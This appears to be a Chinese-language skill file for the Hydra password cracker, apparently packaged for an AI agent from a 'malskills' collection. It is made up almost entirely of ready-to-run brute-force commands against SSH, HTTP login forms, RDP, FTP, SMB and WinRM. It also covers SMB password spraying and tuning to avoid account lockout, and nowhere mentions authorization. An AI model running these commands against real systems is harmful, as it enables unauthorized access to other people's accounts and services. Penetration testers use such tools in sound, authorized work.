---
name: "hydra"
description: ">"
---

# Hydra

*Sourced from killvxk-malskills-zh*

# Hydra

快速并行在线密码破解器，支持 50+ 协议。

## 快速开始

```bash
# SSH 暴力破解
hydra -l admin -P passwords.txt ssh://192.168.1.10

# HTTP POST 表单
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# 多用户 + 密码列表
hydra -L users.txt -P passwords.txt ssh://192.168.1.10
```

## 核心参数

| 参数 | 说明 |
|------|------|
| `-l <user>` | 单个用户名 |
| `-L <file>` | 用户名列表 |
| `-p <pass>` | 单个密码 |
| `-P <file>` | 密码列表 |
| `-u` | 先循环用户再循环密码（默认：先循环密码） |
| `-C <file>` | 冒号分隔的 user:pass 列表 |
| `-t <n>` | 每个 host 的线程数（默认 16） |
| `-T <n>` | 并行目标总数 |
| `-s <port>` | 自定义端口 |
| `-S` | 使用 SSL/TLS |
| `-o <file>` | 输出找到的凭证 |
| `-f` | 找到第一个有效凭证后停止（每个 host） |
| `-F` | 找到第一个有效凭证后停止（所有 host） |
| `-v` | 详细输出 |
| `-V` | 非常详细（显示每次尝试） |
| `-d` | 调试 |
| `-R` | 恢复上一个会话 |
| `-e nsr` | 尝试：n=空密码，s=用户名作为密码，r=反转用户名 |

## 支持的模块（常用）

`ssh`、`ftp`、`http-get`、`http-post-form`、`https-post-form`、`smb`、`rdp`、`winrm`、`imap`、`pop3`、`smtp`、`mysql`、`postgres`、`mssql`、`telnet`、`vnc`、`ldap2`、`redis`

## 常用工作流

```bash
# SSH 配合用户列表
hydra -L users.txt -P rockyou.txt ssh://10.10.10.10 -t 4

# HTTP 表单登录
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
  "/admin/login.php:username=^USER^&password=^PASS^:Wrong password"

# RDP 暴力破解
hydra -l administrator -P passwords.txt rdp://10.10.10.10

# FTP
hydra -l ftp -P passwords.txt ftp://10.10.10.10

# SMB 密码喷洒（单密码，多用户）
hydra -L users.txt -p "Summer2024!" smb://10.10.10.10

# WinRM
hydra -l administrator -P passwords.txt winrm://10.10.10.10

# 限速（避免账户锁定）
hydra -l admin -P passwords.txt ssh://10.10.10.10 -t 1 -W 3
```

## 技巧

- 使用 `-e nsr` 快速试探（空密码、用户名相同、用户名反转）
- 对有锁定策略的协议（RDP、SMB、WinRM）设置 `-t 1-4`
- 对于 HTTP 表单：从响应正文中识别 `failure_message`（失败提示）

## 参考资源

| 文件 | 加载时机 |
|------|----------|
| `references/protocols.md` | 每个协议的模块语法、POST 表单检测、HTTPS 处理 |

